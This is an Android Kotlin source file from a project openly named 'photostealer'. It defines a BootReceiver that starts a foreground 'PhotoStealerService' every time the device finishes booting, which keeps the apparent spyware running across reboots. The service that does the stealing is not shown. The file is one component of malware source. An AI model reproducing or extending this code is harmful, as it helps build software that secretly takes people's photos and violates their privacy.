package com.example.photostealer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d("BootReceiver", "Boot completed - starting service.")
            val serviceIntent = Intent(context, PhotoStealerService::class.java)
            context.startForegroundService(serviceIntent)
        }
    }
}
